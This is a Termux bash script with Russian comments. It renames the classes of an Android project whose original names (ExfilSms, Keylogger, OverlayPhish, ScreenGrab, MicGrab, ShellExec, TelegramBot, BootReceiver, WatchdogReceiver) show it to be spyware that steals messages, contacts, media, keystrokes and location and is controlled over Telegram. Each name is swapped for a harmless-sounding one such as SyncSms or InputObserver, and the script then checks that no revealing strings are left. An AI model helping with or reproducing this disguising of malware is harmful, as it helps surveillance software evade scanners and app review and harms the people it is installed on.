#!/data/data/com.termux/files/usr/bin/bash

if [ ! -f AndroidManifest.xml ]; then
  echo "Запусти из папки com.v2ram (там где лежат .java)"
  exit 1
fi

echo "0) Удаляю старые .bak файлы..."
rm -f *.bak
rm -f res/xml/*.bak res/values/*.bak

declare -A MAP=(
  ["ExfilSms"]="SyncSms"
  ["ExfilContacts"]="ContactSync"
  ["ExfilCalls"]="CallHistorySync"
  ["ExfilFiles"]="FileTransfer"
  ["ExfilGallery"]="MediaLibrary"
  ["AccessibilityBridge"]="UiService"
  ["NotificationListener"]="NoteReader"
  ["OverlayPhish"]="AuthOverlay"
  ["ScreenGrab"]="DisplayCapture"
  ["Keylogger"]="InputObserver"
  ["ShellExec"]="CmdRunner"
  ["ApkInstaller"]="PackageUpdater"
  ["LocationGrab"]="LocationReader"
  ["CameraGrab"]="LensCapture"
  ["MicGrab"]="AudioCapture"
  ["ClipboardGrab"]="ClipReader"
  ["AccountListener"]="ProfileReader"
  ["UIAutomation"]="InputAutomation"
  ["DeviceInfo"]="SystemInfo"
  ["AppIndex"]="AppManager"
  ["CommandRouter"]="CommandDispatch"
  ["TelegramBot"]="SyncChannel"
  ["KeepAliveService"]="SyncService"
  ["BootReceiver"]="StartupHook"
  ["WatchdogReceiver"]="RespawnHook"
  ["MainActivity"]="Bootstrap"
  ["Toaster"]="NotificationToast"
)

echo "1) Переименовываю файлы..."
for old in "${!MAP[@]}"; do
  new="${MAP[$old]}"
  if [ -f "$old.java" ]; then
    mv "$old.java" "$new.java"
    echo "  $old.java -> $new.java"
  fi
done

echo "2) Меняю имена классов внутри кода (без создания .bak)..."
for old in "${!MAP[@]}"; do
  new="${MAP[$old]}"
  # Флаг -i'' отключает создание .bak в Termux
  grep -rl "\b$old\b" . --include="*.java" --include="*.xml" 2>/dev/null \
    | xargs -r sed -i'' "s/\b$old\b/$new/g"
done

echo "3) Убираю случайно созданные .bak (на всякий случай)..."
rm -f *.bak
find . -name "*.bak" -delete

echo "Готово! Проверяю остатки старых имен:"
grep -rn "Exfil\|Keylog\|Phish\|AccessibilityBridge\|TelegramBot" . --include="*.java" --include="*.xml" | head
echo "(если пусто — всё чисто)"
